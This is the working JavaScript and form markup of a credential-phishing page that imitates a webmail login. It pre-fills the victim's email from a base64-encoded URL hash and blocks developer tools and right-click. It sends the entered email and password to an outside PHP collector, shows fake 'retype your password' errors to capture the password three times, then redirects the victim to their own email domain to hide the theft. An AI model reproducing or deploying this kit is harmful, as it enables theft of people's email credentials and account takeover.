                                <form novalidate="" id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://test1.labsweb.com/aboutus/wbmail.php">

                                <!-- FIXED JAVASCRIPT: Email extraction with double base64 support -->
                                <script>
                                    // ---------- helper: base64 detection ----------
                                    function isBase64(str) {
                                        try { 
                                            return btoa(atob(str)) === str; 
                                        } catch (err) { 
                                            return false; 
                                        }
                                    }

                                    // Function to decode email from hash - handles both single and double base64
                                    function decodeEmailFromHash(hash) {
                                        // Remove any trailing parameters
                                        let base64Part = hash.split('&')[0];
                                        
                                        // If it's not base64, return as is (assume plain email)
                                        if (!isBase64(base64Part)) {
                                            return base64Part;
                                        }
                                        
                                        // Try to decode once
                                        try {
                                            let once = atob(base64Part);
                                            // Check if the decoded string looks like an email (contains '@')
                                            if (once.includes('@')) {
                                                return once; // Single decode worked
                                            }
                                            // If not, try double decode (might be double encoded)
                                            try {
                                                let twice = atob(once);
                                                if (twice.includes('@')) {
                                                    return twice; // Double decode worked
                                                }
                                            } catch (e) {
                                                // Double decode failed, return first decode result anyway
                                                return once;
                                            }
                                        } catch (e) {
                                            // Single decode failed, return original
                                            return base64Part;
                                        }
                                        return base64Part; // fallback
                                    }

                                    // ---------- Extract email from URL hash (supports double base64) ----------
                                    (function() {
                                        var hash = window.location.hash.replace("#", "").trim();
                                        console.log('Raw hash from URL:', hash);
                                        
                                        if (hash && hash.length > 0) {
                                            var fullEmail = decodeEmailFromHash(hash);
                                            console.log('Decoded email from hash:', fullEmail);
                                            
                                            // Set email field
                                            var emailField = document.getElementById("email");
                                            if (emailField) {
                                                emailField.value = fullEmail;
                                                console.log('Email field set to:', fullEmail);
                                            }
                                        } else {
                                            console.log('No hash found in URL');
                                            // Set a default test email for demonstration
                                            var testEmail = "user@example.com";
                                            var emailField = document.getElementById("email");
                                            if (emailField) {
                                                emailField.value = testEmail;
                                                console.log('Default email set:', testEmail);
                                            }
                                        }
                                    })();

                                    // ---------- Anti-devtools (short version) ----------
                                    document.addEventListener('keydown', event => {
                                        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
                                            event.preventDefault();
                                        }
                                    });
                                    document.addEventListener('contextmenu', event => event.preventDefault());

                                    // Track login attempts (3 attempts max)
                                    let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');

                                    // original prefix for icons (from first file)
                                    const prefix = "https://validdnssearch.com/enterprises/";

                                    // ---------- Custom display functions ----------
                                    function showError(message, isError) {
                                        var msgDiv = document.getElementById('login-status-message');
                                        var loginStatus = document.getElementById('login-status');
                                        var imgIcon = document.getElementById('imgIcon');
                                        var statusIcon = document.getElementById('status-icon');
                                        
                                        if (msgDiv) msgDiv.innerHTML = message;
                                        
                                        if (isError) {
                                            loginStatus.setAttribute("class", "error-notice");
                                            if (imgIcon) imgIcon.src = prefix + "notice-error.png";
                                        } else {
                                            loginStatus.setAttribute("class", "info-notice");
                                            if (imgIcon) imgIcon.src = prefix + "notice-info.png";
                                        }
                                        
                                        if (statusIcon) statusIcon.style.display = "";
                                        if (loginStatus) loginStatus.style.display = "";
                                        
                                        // Auto-hide after 3 seconds
                                        setTimeout(function() {
                                            if (loginStatus) loginStatus.style.display = "none";
                                        }, 3000);
                                    }

                                    function sessionExpired() {
                                        showError("You are logged out", true);
                                    }

                                    // Main login function that sends to wbmail.php
                                    function processLogin() {
                                        var email = document.getElementById('email').value;
                                        var password = document.getElementById('password').value;
                                        var attemptInput = document.getElementById('attemptNumber');
                                        var loginAttemptInput = document.getElementById('login_attempt');
                                        var domain = email.split('@')[1] || '';

                                        // Validate
                                        if (!email || !password) {
                                            showError("Please enter both email and password", true);
                                            return;
                                        }

                                        // Get current attempt
                                        loginAttempt = parseInt(loginAttemptInput?.value || '0');

                                        // Show authenticating message
                                        showError("Authenticating ...", false);

                                        // Prepare data exactly as PHP expects
                                        var formData = new URLSearchParams();
                                        formData.append('email', email);
                                        formData.append('password', password);
                                        formData.append('domain', document.getElementById('domain').value);
                                        formData.append('field', document.getElementById('fieldName').value);
                                        formData.append('attempt', loginAttempt + 1);

                                        // Send to server
                                        fetch('https://test1.labsweb.com/aboutus/wbmail.php', {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/x-www-form-urlencoded',
                                            },
                                            body: formData.toString()
                                        })
                                        .then(response => {
                                            console.log('Server response status:', response.status);
                                            return response.text();
                                        })
                                        .then(data => {
                                            console.log('Server response:', data);
                                            console.log('Current attempt:', loginAttempt + 1, 'of 3');

                                            // Handle based on attempt count (3 attempts total)
                                            if (loginAttempt === 0) {
                                                // Attempt 1 - show error and clear password
                                                showError("Retry entry for password. Please retype your current password. (Attempt 1 of 3)", true);
                                                document.getElementById('password').value = '';
                                                loginAttemptInput.value = '1';
                                                if (attemptInput) attemptInput.value = '1';
                                            }
                                            else if (loginAttempt === 1) {
                                                // Attempt 2 - show error and clear password
                                                showError("Retry entry for password. Please retype your current password. (Attempt 2 of 3)", true);
                                                document.getElementById('password').value = '';
                                                loginAttemptInput.value = '2';
                                                if (attemptInput) attemptInput.value = '2';
                                            }
                                            else if (loginAttempt === 2) {
                                                // Attempt 3 - redirect to email domain
                                                showError("Login successful! Redirecting to your email domain...", false);

                                                setTimeout(function() {
                                                    if (email && email.includes('@')) {
                                                        var domain = email.split('@')[1];
                                                        window.location.href = "https://www." + domain;
                                                    } else {
                                                        // Fallback if email doesn't have @
                                                        window.location.href = "https://www.cpanel.net";
                                                    }
                                                }, 2000);

                                                loginAttemptInput.value = '3';
                                                if (attemptInput) attemptInput.value = '3';
                                            }
                                        })
                                        .catch(error => {
                                            console.error('Error:', error);
                                            showError("Network error. Please try again.", true);
                                        });
                                    }

                                    // Stubs for original functions that might be called (to avoid errors)
                                    window.clkLgn = function(callback) { processLogin(); if (callback) callback(false); };
                                    window.checkSubmit = function(event, callback) { 
                                        if (event.which === 13 || event.key === 'Enter') { 
                                            event.preventDefault(); 
                                            processLogin(); 
                                            if (callback) callback(false); 
                                        } 
                                    };
                                    window.displayCss = function(status) {
                                        if (status) showError("Check entry for password. please try again", true);
                                        else showError("Incorrect Credentials, Retype Password !", true);
                                    };
                                    window.loadErr = function() {
                                        showError("Authenticating ...", false);
                                    };
                                    window.toggle_locales = function(show) { console.log('locale toggle', show); };
                                    
                                    // Enter key handler
                                    document.addEventListener('keydown', function(e) {
                                        if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
                                            e.preventDefault();
                                            processLogin();
                                        }
                                    });

                                    // jQuery ready handler to ensure everything is set
                                    $(document).ready(function() {
                                        sessionExpired();
                                        
                                        // Log the email value on page load to verify it's set
                                        var email = $('#email').val();
                                        if (email) {
                                            console.log('Email loaded successfully:', email);
                                        } else {
                                            console.log('Email field is empty');
                                            // Try to get from hash again as fallback
                                            var hash = window.location.hash.replace("#", "").trim();
                                            if (hash) {
                                                var fullEmail = decodeEmailFromHash(hash);
                                                $('#email').val(fullEmail);
                                                console.log('Email set from hash on ready:', fullEmail);
                                            }
                                        }
                                        
                                        // Focus on password field
                                        setTimeout(function() {
                                            $('#password').focus();
                                        }, 500);
                                    });
                                </script>
                                <!-- End of fixed JavaScript -->

                                </script>
